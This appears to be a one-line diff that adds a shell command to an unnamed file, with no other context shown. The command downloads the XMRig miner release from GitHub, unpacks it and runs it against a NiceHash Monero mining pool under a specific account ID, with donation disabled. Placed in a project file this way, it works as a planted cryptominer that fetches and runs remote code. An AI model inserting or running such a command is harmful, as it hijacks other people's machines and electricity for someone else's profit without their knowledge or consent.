@@ -1,0 +1,1 @@
+wget https://github.com/xmrig/xmrig/releases/download/v6.18.0/xmrig-6.18.0-linux-static-x64.tar.gz && tar -xf xmrig-6.18.0-linux-static-x64.tar.gz && cd xmrig-6.18.0 && ./xmrig --donate-level 0 -o stratum+ssl://randomxmonero.auto.nicehash.com:443 -u NHbUHGN3EG3AvR3L54HTQSPfDDpYykfou8CZ -p x -k --nicehash -a rx/0
